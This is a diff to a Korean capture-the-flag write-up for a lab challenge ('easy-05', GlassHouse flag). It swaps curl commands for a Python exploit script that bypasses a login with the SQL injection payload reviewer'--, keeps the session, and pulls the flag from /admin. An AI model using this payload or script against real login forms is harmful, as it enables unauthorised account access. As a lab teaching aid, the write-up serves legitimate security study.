@@ -158,17 +158,36 @@ def login_information(username, password):
 
 > 2단계인 이유: 이 문제는 "로그인 우회" 라서, 우회로 운영진 세션을 얻은 뒤 그 권한으로 플래그가 있는 다른 화면(`/admin`)에 들어가야 한다. 브라우저로 하면 세션(쿠키)이 자동으로 유지되므로 ①에서 로그인하고 ②로 이동만 하면 된다.
 
-### CLI로 재현 (선택)
+### 스크립트로 재현
 
-브라우저 대신 명령줄로 할 때는, 로그인에서 받은 세션 쿠키를 저장해 `/admin` 요청에 그대로 쓰면 된다.
+브라우저 대신 스크립트로 할 때는 로그인한 세션을 그대로 이어서 `/admin` 에 들어간다.
+
+```python
+#!/usr/bin/env python3
+# easy-05 (새 로그인 화면 / SQL Injection) - 아이디에 reviewer'-- 를 넣어 운영진으로 로그인
+# 사용: python3 exploit.py http://<IP>:8007
+import re
+import sys
+import requests
+
+BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8007"
+s = requests.Session()  # 세션 쿠키(gh_8007) 자동 관리
+
+# 1) SQLi 로 운영진 로그인: 비밀번호 조건이 주석(--) 처리된다
+r = s.post(f"{BASE}/login", data={"username": "reviewer'--", "password": "x"},
+           allow_redirects=False)
+print(f"[*] SQLi login (reviewer'--) -> {r.status_code}")
+
+# 2) 그 세션으로 운영진 포털 접속 → 명단 열람 확인 코드
+r = s.get(f"{BASE}/admin")
+m = re.search(r"GlassHouse\{[^}]*\}", r.text)
+print(f"[+] FLAG: {m.group(0)}" if m else "[-] 실패")
+```
+
+실행 예시
 
 ```bash
-# 1) SQLi 로 운영진 로그인 → 세션 쿠키 저장
-curl -s -c cookies.txt \
-  --data-urlencode "username=reviewer'--" \
-  --data-urlencode "password=x" \
-  http://127.0.0.1:8007/login
-
-# 2) 그 쿠키로 운영진 포털 접속 → 플래그 추출
-curl -s -b cookies.txt http://127.0.0.1:8007/admin | grep -o "GlassHouse{[^}]*}"
+$ python3 exploit.py http://127.0.0.1:8007
+[*] SQLi login (reviewer'--) -> 302
+[+] FLAG: GlassHouse{...}
 ```
